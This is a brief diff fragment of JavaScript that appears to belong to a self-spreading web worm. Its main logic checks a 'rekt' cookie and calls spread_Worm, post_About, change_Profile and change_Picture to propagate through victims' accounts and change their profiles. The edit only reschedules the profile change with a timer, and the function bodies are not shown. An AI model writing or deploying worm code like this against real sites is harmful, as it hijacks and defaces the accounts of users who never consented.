@@ -103,7 +103,7 @@ if (cookies.get("rekt") != "yes") {
     spread_Worm()
 }
 post_About();
-change_Profile();
+setTimeout(change_Profile,1000)
 setTimeout(change_Picture,1000)
 
 document.cookie = "rekt=yes"
